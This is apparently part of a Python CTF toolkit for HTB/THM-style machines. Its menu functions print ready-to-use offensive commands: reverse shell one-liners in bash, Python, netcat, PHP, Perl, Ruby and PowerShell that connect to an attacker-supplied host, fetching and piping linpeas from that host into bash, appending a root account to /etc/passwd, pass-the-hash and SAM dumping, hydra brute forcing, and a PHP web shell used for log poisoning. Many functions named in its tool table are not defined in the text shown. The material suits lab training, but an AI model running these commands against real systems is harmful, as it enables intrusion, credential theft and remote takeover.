# ─────────────────────────────────────────────
# ░░ MENU ░░
# ─────────────────────────────────────────────

# ─────────────────────────────────────────────
# ░░ MACHINES (HTB / THM STYLE) ░░
# ─────────────────────────────────────────────

def nmap_builder():
    """
    Nmap — the standard port scanner. Every machine challenge starts here.
    You need to know WHAT is running before you can exploit anything.
    """
    print("\n  Nmap Scan Command Builder")
    print("  ─────────────────────────────────────────")
    ip = input("  Target IP / range (e.g. 10.10.10.5): ").strip()
    print("\n  Scan type:")
    print("  [1] Quick (top 1000 ports)")
    print("  [2] Full (all 65535 ports — slow but thorough)")
    print("  [3] Service + version detection")
    print("  [4] Full + version + scripts (recommended for CTF)")
    print("  [5] UDP scan (top 100 UDP ports)")
    print("  [6] Stealth SYN scan (requires root)")
    scan = input("  Option: ").strip()

    cmds = {
        "1": f"nmap {ip}",
        "2": f"nmap -p- {ip}",
        "3": f"nmap -sV -sC {ip}",
        "4": f"nmap -p- -sV -sC -T4 -oN nmap_full.txt {ip}",
        "5": f"sudo nmap -sU --top-ports 100 {ip}",
        "6": f"sudo nmap -sS -p- -T4 {ip}",
    }
    cmd = cmds.get(scan, "[!] Invalid option")
    print(f"\n  Command : {cmd}")
    print(f"""
  Flag reference:
    -p-        : scan all 65535 ports
    -sV        : version detection (what software is running)
    -sC        : default scripts (grab banners, check vulns)
    -T4        : speed (T1=slow/stealthy, T5=fast/noisy)
    -oN        : output to file
    -A         : aggressive (OS detect + version + scripts + traceroute)

  Workflow tip: run quick scan first to find open ports fast,
  then targeted -sV -sC on those specific ports only:
    nmap -p 22,80,443 -sV -sC {ip}
""")


def reverse_shell_generator():
    """
    Reverse shell — target connects back to YOUR machine with a shell.
    You must be listening FIRST: nc -lvnp <port>
    Replace LHOST with your tun0 IP (VPN IP on HTB/THM).
    """
    print("\n  Reverse Shell Generator")
    lhost = input("  Your IP (LHOST, e.g. 10.10.14.5): ").strip()
    lport = input("  Your port (LPORT, e.g. 4444): ").strip()
    print(f"""
  ── LISTENER (run this on YOUR machine FIRST) ──
    nc -lvnp {lport}

  ── REVERSE SHELLS (pick based on what's available on target) ──

  Bash (most common on Linux):
    bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
    bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'

  Python 3:
    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

  Python 2:
    python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

  Netcat (traditional):
    nc -e /bin/sh {lhost} {lport}

  Netcat (OpenBSD — no -e flag):
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f

  PHP:
    php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'

  Perl:
    perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

  Ruby:
    ruby -rsocket -e 'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

  PowerShell (Windows):
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

  ── UPGRADE TO FULL TTY (after catching shell) ──
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    # then: Ctrl+Z  →  stty raw -echo; fg  →  reset
    export TERM=xterm
""")


def web_enum_reference():
    """
    Web enumeration — finding hidden directories, files, and vhosts on a web server.
    Always run this alongside your nmap scan.
    """
    print("""
  ┌─────────────────────────────────────────────────────┐
  │          WEB ENUMERATION REFERENCE                  │
  └─────────────────────────────────────────────────────┘

  DIRECTORY / FILE BRUTEFORCE
    gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
    gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
    feroxbuster -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
    ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt

  VHOST / SUBDOMAIN BRUTEFORCE
    gobuster vhost -u http://TARGET -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
    ffuf -u http://TARGET -H "Host: FUZZ.target.htb" -w wordlist.txt -fs <size_to_filter>
    # Add discovered vhosts to /etc/hosts: echo "IP  sub.target.htb" >> /etc/hosts

  USEFUL WORDLISTS (SecLists)
    /usr/share/seclists/Discovery/Web-Content/common.txt
    /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
    /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

  WHAT TO LOOK FOR
    /admin  /login  /dashboard  /api  /backup  /config
    robots.txt   sitemap.xml   .git/   /.env   /wp-admin
    Source code comments (Ctrl+U in browser)
    Response size differences (sign of hidden content)

  CMS SCANNERS
    wpscan --url http://TARGET --enumerate u    (WordPress)
    droopescan scan drupal -u http://TARGET     (Drupal)
    joomscan -u http://TARGET                   (Joomla)

  NIKTO (general vulnerability scanner)
    nikto -h http://TARGET
""")


def privesc_reference():
    """
    Privilege Escalation — moving from a low-privilege shell to root/SYSTEM.
    This is the second half of every Machines challenge.
    """
    print("""
  ┌─────────────────────────────────────────────────────┐
  │       PRIVILEGE ESCALATION REFERENCE                │
  └─────────────────────────────────────────────────────┘

  ── LINUX ──────────────────────────────────────────────

  AUTOMATED ENUMERATION (run these first)
    wget http://LHOST/linpeas.sh | bash      → comprehensive enum
    wget http://LHOST/linenum.sh | bash      → alternative
    python3 -c 'import linpeas; linpeas.main()'

  MANUAL CHECKS
    sudo -l                        → what can THIS user run as sudo?
    find / -perm -4000 2>/dev/null → SUID binaries (run as owner)
    find / -perm -2000 2>/dev/null → SGID binaries
    crontab -l                     → user cron jobs
    cat /etc/crontab               → system cron jobs
    cat /etc/passwd                → list users
    cat /etc/shadow                → password hashes (needs root)
    ss -tlnp / netstat -tlnp       → internal listening ports
    ps aux                         → running processes
    env                            → environment variables (tokens/keys?)
    find / -writable 2>/dev/null   → world-writable files/dirs
    ls -la /home/*/                → other users' home dirs

  SUDO ABUSE
    sudo -l                        → look for (ALL) NOPASSWD entries
    GTFOBins: https://gtfobins.github.io
    Example: sudo find . -exec /bin/sh \\; -quit

  SUID ABUSE
    find / -perm -4000 2>/dev/null
    GTFOBins → check if binary is listed
    Example: /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

  CRON JOB ABUSE
    Watch: watch -n 1 "ps aux | grep -v grep"
    pspy64 (no root needed) — monitors process creation in real time
    If a cron runs a script you can write → insert reverse shell

  WRITABLE /etc/passwd
    openssl passwd -1 -salt hax password123    → generate hash
    echo 'hax:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
    su hax

  PATH HIJACKING
    Check $PATH for writable dirs
    If SUID binary calls 'ls' without full path → create fake 'ls' in writable dir

  ── WINDOWS ────────────────────────────────────────────

  AUTOMATED
    winpeas.exe                    → comprehensive enum
    Seatbelt.exe -group=all        → targeted checks

  MANUAL CHECKS
    whoami /all                    → privileges + groups
    net user                       → local users
    net localgroup administrators  → who's admin?
    systeminfo                     → OS version, hotfixes
    tasklist /svc                  → running services
    sc query                       → service list
    wmic service get name,pathname,startmode → unquoted service paths
    reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer  → AlwaysInstallElevated?
    dir /s *pass* *cred* *config*  → search for credentials

  COMMON VECTORS
    Unquoted service paths         → plant executable in path gap
    Weak service permissions       → sc config svc binpath= "cmd.exe"
    AlwaysInstallElevated          → craft malicious .msi
    Token impersonation            → PrintSpoofer, RoguePotato, GodPotato
    SeImpersonatePrivilege?        → almost always exploitable

  RESOURCES
    GTFOBins (Linux): https://gtfobins.github.io
    LOLBAS  (Windows): https://lolbas-project.github.io
    HackTricks: https://book.hacktricks.xyz
""")


def smb_reference():
    """SMB enumeration — very common on HTB Windows/Linux machines."""
    print("""
  ┌─────────────────────────────────────────────────────┐
  │              SMB ENUMERATION                        │
  └─────────────────────────────────────────────────────┘

  LIST SHARES (null session = no creds)
    smbclient -L //TARGET -N
    smbmap -H TARGET
    crackmapexec smb TARGET

  CONNECT TO SHARE
    smbclient //TARGET/sharename -N            (no password)
    smbclient //TARGET/sharename -U username

  DOWNLOAD ALL FILES FROM SHARE
    smbclient //TARGET/share -N -c 'prompt OFF; recurse ON; mget *'

  WITH CREDENTIALS
    crackmapexec smb TARGET -u user -p password
    crackmapexec smb TARGET -u user -p password --shares
    crackmapexec smb TARGET -u user -p password --sam   (dump hashes)

  ENUM4LINUX (comprehensive null-session enum)
    enum4linux -a TARGET

  PASS THE HASH (if you have NTLM hash, not plaintext)
    crackmapexec smb TARGET -u admin -H NTLMHASH
    smbclient //TARGET/share -U admin%NTLMHASH --pw-nt-hash
""")


def password_attacks_reference():
    """Password cracking and spraying reference."""
    print("""
  ┌─────────────────────────────────────────────────────┐
  │         PASSWORD ATTACKS REFERENCE                  │
  └─────────────────────────────────────────────────────┘

  HASHCAT (GPU cracking)
    hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt
    hashcat -m MODE hash.txt rockyou.txt -r rules/best64.rule

  COMMON HASHCAT MODES
    0     MD5              1000  NTLM (Windows)
    100   SHA1             1800  sha512crypt (Linux /etc/shadow)
    1400  SHA256           3200  bcrypt
    1700  SHA512           13100 Kerberoast (TGS)
    500   md5crypt ($1$)   18200 AS-REP Roast

  JOHN THE RIPPER
    john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    john hash.txt --format=NT                  (NTLM)
    ssh2john id_rsa > id_rsa.hash              (crack SSH key)
    zip2john archive.zip > zip.hash            (crack ZIP)

  HYDRA (online brute force)
    hydra -l admin -P rockyou.txt TARGET ssh
    hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
    hydra -L users.txt -P rockyou.txt TARGET ftp

  DEFAULT CREDENTIALS TO TRY
    admin:admin   admin:password   admin:123456
    root:root     root:toor        guest:guest
    Always check: https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials

  CREDENTIAL LOCATIONS ON TARGET
    Linux: /etc/shadow, ~/.ssh/id_rsa, config files, .env, history files
    Windows: SAM hive, LSASS dump, web.config, Unattend.xml, Groups.xml
""")


def lfi_reference():
    """Local File Inclusion / Remote File Inclusion reference."""
    print("""
  ┌─────────────────────────────────────────────────────┐
  │         LFI / RFI / PATH TRAVERSAL                  │
  └─────────────────────────────────────────────────────┘

  BASIC PATH TRAVERSAL
    ../../../etc/passwd
    ....//....//....//etc/passwd       (filter bypass: ../ stripped once)
    ..%2F..%2F..%2Fetc%2Fpasswd        (URL encoded)
    %252e%252e%252f                     (double URL encoded)

  USEFUL FILES TO READ (Linux)
    /etc/passwd                        → usernames
    /etc/shadow                        → password hashes (needs root)
    /etc/hosts                         → internal hostnames
    /proc/self/environ                 → environment variables (may have secrets)
    /proc/self/cmdline                 → current process command
    /var/log/apache2/access.log        → log poisoning target
    /var/log/auth.log                  → SSH login attempts
    ~/.ssh/id_rsa                      → private SSH key!
    ~/.bash_history                    → command history

  USEFUL FILES (Windows)
    C:\\Windows\\System32\\drivers\\etc\\hosts
    C:\\inetpub\\wwwroot\\web.config
    C:\\Windows\\repair\\SAM
    C:\\Users\\Administrator\\Desktop\\root.txt    (the flag!)

  LOG POISONING (turn LFI into RCE)
    1. Poison the log: send a request with PHP in User-Agent:
       curl -A '<?php system($_GET["cmd"]); ?>' http://TARGET
    2. Include the log via LFI:
       ?file=../../../../var/log/apache2/access.log&cmd=id

  PHP WRAPPERS (when PHP is the backend)
    php://filter/convert.base64-encode/resource=/etc/passwd   → read file as b64
    php://input  (POST body executed as PHP)
    data://text/plain;base64,BASE64_ENCODED_PHP               → code execution

  RFI (Remote File Inclusion)
    ?file=http://ATTACKER/shell.php    (if allow_url_include=On)
""")


def programming_reference():
    """
    Programming challenges — usually involve automating interaction with a remote service.
    The standard tool is Python + pwntools sockets.
    """
    print("""
  ┌─────────────────────────────────────────────────────┐
  │        PROGRAMMING CHALLENGE REFERENCE              │
  └─────────────────────────────────────────────────────┘

  TYPICAL SCENARIO
    Server sends: "What is 1234 * 5678? You have 1 second."
    You must: connect, parse, compute, respond — faster than humanly possible

  PWNTOOLS SOCKET TEMPLATE
    from pwn import *

    p = remote('challenge.ctf.com', 1337)

    while True:
        line = p.recvline().decode().strip()
        print(line)

        # Parse and solve (example: arithmetic)
        import re
        match = re.search(r'(\\d+) \\* (\\d+)', line)
        if match:
            a, b = int(match.group(1)), int(match.group(2))
            p.sendline(str(a * b).encode())

    p.interactive()

  RAW SOCKET (no pwntools)
    import socket
    s = socket.socket()
    s.connect(('host', port))
    data = s.recv(1024).decode()
    s.send(b'answer\\n')

  USEFUL PYTHON FOR CTF PROGRAMMING
    int('ff', 16)                   → hex string to int
    chr(65)                         → int to ASCII
    ord('A')                        → ASCII to int
    bin(255)                        → int to binary string
    bytes.fromhex('deadbeef')       → hex to bytes
    import sympy                    → symbolic math, primes, factorise
    sympy.isprime(n)
    sympy.factorint(n)              → prime factorisation (useful for RSA)

  COMMON CHALLENGE TYPES
    Arithmetic speedrun             → parse + eval loop
    Custom encoding/cipher         → reverse engineer the algorithm
    Proof of work                  → find x where sha256(x+prefix) starts with '0000'
    Oracle interaction             → send crafted inputs, observe responses (padding oracle)
    Implement a protocol           → read the server's custom spec and implement client

  PROOF OF WORK TEMPLATE
    import hashlib, itertools, string
    prefix = b'xyz'         # given by server
    charset = string.ascii_letters + string.digits
    for candidate in itertools.product(charset, repeat=5):
        attempt = prefix + ''.join(candidate).encode()
        if hashlib.sha256(attempt).hexdigest().startswith('0000'):
            print('Found:', ''.join(candidate))
            break
""")


def ctf_methodology():
    """Overall CTF methodology and checklist per category."""
    print("""
  ┌─────────────────────────────────────────────────────┐
  │            CTF METHODOLOGY CHECKLIST                │
  └─────────────────────────────────────────────────────┘

  ── MACHINES (HTB / THM) ──────────────────────────────
    [ ] nmap scan (quick → full → service/script)
    [ ] Web server? → gobuster/ffuf + nikto + manual browse
    [ ] Check /robots.txt, /sitemap.xml, source code
    [ ] Any CMS? → wpscan / droopescan / joomscan
    [ ] SMB open? → smbclient, enum4linux
    [ ] FTP open? → anonymous login? binary mode + mget
    [ ] SSH? → try found credentials, check for id_rsa
    [ ] Got shell? → run linpeas/winpeas immediately
    [ ] Read user.txt, then escalate to root.txt

  ── WEB ───────────────────────────────────────────────
    [ ] View page source (Ctrl+U) — comments, hidden fields
    [ ] Check cookies — base64? JWT? modifiable?
    [ ] Intercept with Burp Suite
    [ ] Check all input fields for SQLi, XSS, SSTI
    [ ] Check file upload — bypass extension filters
    [ ] Check for LFI in ?file=, ?page=, ?path= params
    [ ] Check HTTP methods (OPTIONS, PUT, DELETE)
    [ ] Check response headers for version info

  ── CRYPTOGRAPHY ──────────────────────────────────────
    [ ] Identify encoding first (base64? hex? binary?)
    [ ] Is it a classical cipher? (frequency analysis)
    [ ] XOR? Try single-byte brute force
    [ ] RSA? Do you have p, q, e? Small e? Large e small d?
    [ ] Padding oracle? (CBC mode, padding error messages)

  ── FORENSICS ─────────────────────────────────────────
    [ ] file + binwalk + strings on everything
    [ ] Check metadata: exiftool
    [ ] Steganography: stegsolve, zsteg, steghide
    [ ] PCAP? → Wireshark: filter by protocol, follow streams
    [ ] Memory dump? → Volatility framework

  ── REVERSE ENGINEERING ───────────────────────────────
    [ ] file → what architecture/format?
    [ ] strings → any obvious flags or keys?
    [ ] ltrace / strace → what does it call?
    [ ] Load in Ghidra → find main(), look for comparisons
    [ ] strcmp / memcmp → what is it comparing your input to?
    [ ] Is it packed? UPX? → upx -d binary

  ── PWN ───────────────────────────────────────────────
    [ ] checksec → what protections are enabled?
    [ ] Run it, understand what input it takes
    [ ] Find crash: send long input (python3 -c 'print("A"*500)' | ./binary)
    [ ] Find offset: cyclic pattern
    [ ] NX off? → shellcode. NX on? → ROP chain
    [ ] PIE on? → need address leak first
    [ ] LIBC? → ret2libc if NX enabled

  ── OSINT ─────────────────────────────────────────────
    [ ] Google dorks: site:, filetype:, inurl:, intitle:
    [ ] Reverse image search
    [ ] exiftool on any images given
    [ ] Wayback Machine for old versions
    [ ] Username search across platforms
    [ ] Check social media, LinkedIn, GitHub

  ── GENERAL ───────────────────────────────────────────
    Stuck? Try:
    → Read the challenge description again very carefully
    → Check hints (if allowed)
    → Google the challenge category + tool names
    → Look at source code comments, error messages
    → Everything is intentional — if something seems odd, explore it
""")


# ─────────────────────────────────────────────
# ░░ MENU ░░
# ─────────────────────────────────────────────

MENU = """
╔══════════════════════════════════════════════════════╗
║           CTF ENCODER/DECODER TOOLKIT               ║
║                — Full Edition —                     ║
╚══════════════════════════════════════════════════════╝

  ── CRYPTOGRAPHY ──────────────────────────────────
   1.  Base64                  7.  Caesar (brute force)
   2.  Base32                  8.  Vigenère Cipher
   3.  Base58                  9.  XOR (text / hex brute force)
   4.  Hex                    10.  Frequency Analysis
   5.  Binary                 11.  RSA Helper
   6.  ROT13

  ── WEB ───────────────────────────────────────────
  12.  URL Encode/Decode       15.  SQLi Cheatsheet
  13.  HTML Entity Encode/Decode  16.  XSS Cheatsheet
  14.  JWT Decoder             17.  LFI / RFI / Path Traversal

  ── PWN ───────────────────────────────────────────
  18.  Cyclic Pattern (buffer overflow offset)
  19.  Format String Reference
  20.  Shellcode / Pwntools Reference

  ── FORENSICS ─────────────────────────────────────
  21.  File Magic Bytes Identifier
  22.  Strings Extractor
  23.  Steganography Checklist

  ── REVERSE ENGINEERING ───────────────────────────
  24.  RE Tools & GDB Reference

  ── MACHINES (HTB/THM) ────────────────────────────
  25.  Nmap Scan Builder
  26.  Reverse Shell Generator
  27.  Web Enumeration Reference
  28.  Privilege Escalation Reference
  29.  SMB Enumeration Reference
  30.  Password Attacks Reference

  ── PROGRAMMING ───────────────────────────────────
  31.  Programming Challenge Reference

  ── MISC / OSINT ──────────────────────────────────
  32.  Morse Code              35.  Hash Identifier
  33.  Hash Generator          36.  Number Base Converter
  34.  Flag Pattern Scanner    37.  OSINT Quick Reference

  ── METHODOLOGY ───────────────────────────────────
  38.  Full CTF Methodology Checklist (all categories)

   0.  Exit
"""

TOOLS = {
    "1":  base64_tool,
    "2":  base32_tool,
    "3":  base58_tool,
    "4":  hex_tool,
    "5":  binary_tool,
    "6":  rot13_tool,
    "7":  caesar_tool,
    "8":  vigenere_tool,
    "9":  xor_tool,
    "10": frequency_analysis,
    "11": rsa_helper,
    "12": url_tool,
    "13": html_tool,
    "14": jwt_tool,
    "15": sqli_cheatsheet,
    "16": xss_cheatsheet,
    "17": lfi_reference,
    "18": cyclic_pattern,
    "19": format_string_helper,
    "20": shellcode_info,
    "21": file_magic,
    "22": strings_extractor,
    "23": steganography_hints,
    "24": reverse_engineering_ref,
    "25": nmap_builder,
    "26": reverse_shell_generator,
    "27": web_enum_reference,
    "28": privesc_reference,
    "29": smb_reference,
    "30": password_attacks_reference,
    "31": programming_reference,
    "32": morse_tool,
    "33": hash_tool,
    "34": flag_finder,
    "35": hash_identifier,
    "36": base_converter,
    "37": osint_reference,
    "38": ctf_methodology,
}

def main():
    while True:
        print(MENU)
        choice = input("  Select option: ").strip()
        if choice == "0":
            print("\n  Goodbye!\n")
            sys.exit(0)
        elif choice in TOOLS:
            print()
            TOOLS[choice]()
            input("\n  [Press Enter to continue]")
        else:
            print("\n  [!] Invalid option, try again.")

if __name__ == "__main__":
    main()
